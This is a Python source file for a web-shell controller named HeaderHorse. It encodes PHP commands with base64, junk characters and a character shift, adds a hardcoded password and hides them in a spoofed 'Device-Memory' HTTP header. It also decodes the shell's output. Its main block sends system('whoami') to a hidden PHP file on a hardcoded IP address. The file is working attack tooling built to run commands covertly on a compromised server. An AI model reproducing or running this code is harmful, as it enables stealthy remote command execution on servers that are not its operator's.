import base64
import random
import re
import requests
from libs.Misc import Config


class HeaderHorse:
    @staticmethod
    def encrypt(info):
        fill_num = 3 - len(info) % 3 if len(info) % 3 else 0
        info = base64.b64encode((info+' '*fill_num).encode()).decode()
        confuse_str = '-*_!@%$#&.,<>'
        for i in range(random.randint(0, len(confuse_str))):
            pos = random.randint(0, len(info))
            info = info[:pos] + random.choice(confuse_str) + info[pos:]
        res = ''
        for i in info:
            res += chr(ord(i) + 1)
        return base64.b64encode(res.encode()).decode()

    @staticmethod
    def decrypt(info):
        info = base64.b64decode(info.encode()).decode()
        res = ''
        for i in info:
            res += chr(ord(i) - 1)
        info = re.sub(r'-|\*|_|!|@|%|\$|#|&|\.|,|<|>', '', res)
        return base64.b64decode(info.encode('utf-8')).decode('utf-8', 'ignore')

    @staticmethod
    def operate(url, code):
        code = code.replace('"', "'")
        password = "@CDUT@"
        json_str = '{"cmd":"' + code + '","pass":"' + password + '"}'
        payload = HeaderHorse.encrypt(json_str)
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Device-Memory': payload
        }
        proxy = Config.proxy
        response = requests.get(url, headers=header, proxies=proxy)
        return response


if __name__ == '__main__':
    url_ = 'http://47.112.138.115:25896/include/.config_cdut.php'
    code_ = "system('whoami');"
    res_ = HeaderHorse.operate(url_, code_)
    result = res_.content.decode()
    result = result.split("*----START----*")[1].split("*----END----*")[0]
    print(HeaderHorse.decrypt(result))
